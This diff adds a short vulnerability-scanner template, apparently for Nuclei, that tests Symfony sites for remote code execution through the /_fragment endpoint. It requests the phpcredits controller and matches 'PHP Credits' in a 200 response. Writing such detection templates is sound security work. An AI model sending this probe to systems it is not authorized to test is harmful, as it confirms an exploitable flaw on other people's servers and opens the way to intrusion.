@@ -1,0 +1,26 @@
+id: rce-symfony
+
+info:
+  name: symfony rce
+  author: ELSFA7110
+  severity: high
+  reference: |
+    - https://www.acunetix.com/vulnerabilities/web/symfony-rce-via-weak-predictable-app_secret
+    - https://www.ambionics.io/blog/symfony-secret-fragment
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Credits"
+        part: body
+
+      - type: status
+        status:
+          - 200
